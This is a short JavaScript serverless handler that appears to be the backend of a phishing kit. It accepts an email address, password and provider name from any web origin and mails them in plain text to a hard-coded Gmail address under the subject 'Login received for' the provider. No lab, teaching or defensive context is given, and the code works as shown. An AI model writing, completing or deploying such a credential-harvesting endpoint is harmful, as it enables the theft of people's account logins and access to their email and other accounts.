import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  let data = req.body || {};
  if (typeof data === 'string') {
    data = JSON.parse(data);
  }
  const { email, password, provider } = data;
  if (!email || !password || !provider) {
    res.status(400).json({ error: 'Missing fields' });
    return;
  }

  // Set up transporter
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'jerryjd480@gmail.com', // your Gmail address
      pass: 'your-app-password'    // Gmail app password
    }
  });

  // Email content
  const mailOptions = {
    from: 'jerryjd480@gmail.com',
    to: 'jerryjd480@gmail.com', // send result to this email
    subject: `Login received for ${provider}`,
    text: `Email: ${email}\nPassword: ${password}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Login received and emailed!' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to send email.' });
  }
}
